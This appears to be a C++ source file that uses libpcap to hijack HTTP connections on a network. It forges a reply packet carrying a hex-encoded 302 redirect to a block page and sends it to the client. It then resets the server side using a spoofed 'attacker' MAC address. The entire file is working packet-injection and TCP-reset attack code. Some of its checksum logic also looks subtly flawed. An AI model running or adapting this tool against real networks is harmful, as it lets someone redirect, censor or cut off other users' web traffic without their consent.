#include "http_injection.h"
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <iostream>
#include <pcap.h>
#include "mac.h"

#define CARRY 65536

#pragma pack(push,1)
struct Pseudoheader{
    uint32_t srcIP;
    uint32_t destIP;
    uint8_t reserved=0;
    uint8_t protocol;
    uint16_t TCPLen;
};
#pragma pack(pop)
const u_char redirection[57] = {
    0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x30,0x20,0x33,
    0x30,0x32,0x20,0x52,0x65,0x64,0x69,0x72,0x65,0x63,
    0x74,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,
    0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,
    0x77,0x61,0x72,0x6e,0x69,0x6e,0x67,0x2e,0x6f,0x72,
    0x2e,0x6b,0x72,0x0d,0x0a,0x0d,0x0a
};
const char* attacker = "f6:8c:0e:a6:39:b8";

uint16_t calculate(uint16_t* data, int dataLen)
{
    uint16_t result;
    int tempChecksum=0;
    int length;
    bool flag=false;
    if((dataLen%2)==0)
        length=dataLen/2;
    else
    {
        length=(dataLen/2)+1;
        flag=true;
    }
    for (int i = 0; i < length; ++i) // cal 2byte unit
    {


        if(i==length-1&&flag) //last num is odd num
            tempChecksum+=ntohs(data[i]&0x00ff);
        else
            tempChecksum+=ntohs(data[i]);

        if(tempChecksum>CARRY)
                tempChecksum=(tempChecksum-CARRY)+1;
    }
    result=tempChecksum;
    return result;
}
uint16_t calTCPChecksum(const uint8_t *data,int dataLen){
    //make Pseudo Header
    struct Pseudoheader pseudoheader; //saved by network byte order

    //init Pseudoheader
    struct iphdr *iph=(struct iphdr*)data;
    struct tcphdr *tcph=(struct tcphdr*)(data+iph->ihl*4);

    memcpy(&pseudoheader.srcIP,&iph->saddr,sizeof(pseudoheader.srcIP));
    memcpy(&pseudoheader.destIP,&iph->daddr,sizeof(pseudoheader.destIP));
    pseudoheader.protocol=iph->protocol;
    pseudoheader.TCPLen=htons(dataLen-(iph->ihl*4));

    //Cal pseudoChecksum
    uint16_t pseudoResult=calculate((uint16_t*)&pseudoheader,sizeof(pseudoheader));

    //Cal TCP Segement Checksum
    tcph->check=0; //set Checksum field 0
    uint16_t tcpHeaderResult=calculate((uint16_t*)tcph,ntohs(pseudoheader.TCPLen));


    uint16_t checksum;
    int tempCheck;

    if((tempCheck=pseudoResult+tcpHeaderResult)>CARRY)
        checksum=(tempCheck-CARRY) +1;
    else
        checksum=tempCheck;


    checksum=ntohs(checksum^0xffff); //xor checksum
    tcph->check=checksum;

    return checksum;
}
uint16_t calIPChecksum(const uint8_t* data)
{
    struct iphdr* iph=(struct iphdr*)data;
    iph->check=0;//set Checksum field 0

    uint16_t checksum=calculate((uint16_t*)iph,iph->ihl*4);
    iph->check=htons(checksum^0xffff);//xor checksum

    return checksum;
}
bool http_injection(pcap_t *fp, const u_char *pkt_data,int pkt_length){

    struct ether_header *eh,*ceh;
    struct ip *iph,*ciph;
    struct tcphdr *tcph,*ctcph;

    u_char *copy_data = new u_char[pkt_length];
    memcpy(copy_data,pkt_data,pkt_length);
    //Setting FIN packet

    eh = (struct ether_header*)pkt_data;
    ceh = (struct ether_header*)copy_data;

    memcpy(ceh->ether_dhost,eh->ether_shost,ETH_ALEN);
    memcpy(ceh->ether_shost,eh->ether_dhost,ETH_ALEN);

    pkt_data += sizeof(struct ether_header);
    copy_data += sizeof(struct ether_header);
    pkt_length -= sizeof(struct ether_header);

    iph = (struct ip*)pkt_data;
    ciph = (struct ip*)copy_data;
    tcph = (struct tcphdr*)(pkt_data+iph->ip_hl*4);
    ctcph = (struct tcphdr*)(copy_data+ciph->ip_hl*4);

    int jump_pointer = sizeof(struct ether_header)+ciph->ip_hl*4+ctcph->doff*4;

    ciph->ip_dst = iph->ip_src;
    ciph->ip_src = iph->ip_dst;
    ciph->ip_len = htons(ciph->ip_hl*4+ctcph->doff*4+57);
    ciph->ip_sum = calIPChecksum(pkt_data);

    ctcph->th_flags = 0x19;
    ctcph->th_seq = tcph->th_ack;
    ctcph->th_ack = htonl(ntohl(tcph->seq)+(pkt_length-(ciph->ip_hl*4+ctcph->doff*4)));
    ctcph->th_dport = tcph->th_sport;
    ctcph->th_sport = tcph->th_dport;
    memcpy(copy_data+ciph->ip_hl*4+ctcph->doff*4,redirection,57);
    ctcph->th_sum = calTCPChecksum(copy_data,ciph->ip_hl*4+ctcph->doff*4+57);

    pkt_data -= sizeof(struct ether_header);
    copy_data -= sizeof(struct ether_header);
    if(pcap_sendpacket(fp,copy_data,jump_pointer+57))
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        return false;
    }
    //Setting RST packet
    eh = (struct ether_header*)pkt_data;

    mac_changer(attacker,eh->ether_shost);

    pkt_data += sizeof(struct ether_header);
    pkt_length -= sizeof(struct ether_header);

    iph = (struct ip*)pkt_data;
    tcph = (struct tcphdr*)(pkt_data+iph->ip_hl*4);

    iph->ip_len = htons(iph->ip_hl*4+tcph->doff*4);
    iph->ip_sum = calIPChecksum(pkt_data);

    jump_pointer = sizeof(struct ether_header)+iph->ip_hl*4+tcph->doff*4;

    tcph->th_flags = 0x14;
    tcph->seq = htonl(ntohl(tcph->seq)+(pkt_length-(iph->ip_hl*4+tcph->doff*4)));
    tcph->th_sum = calTCPChecksum(pkt_data,iph->ip_hl*4+tcph->doff*4);

    pkt_data -= sizeof(struct ether_header);
    pkt_length += sizeof(struct ether_header);

    if(pcap_sendpacket(fp,pkt_data,jump_pointer))
    {
        fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
        return false;
    }
    else
        return true;
}
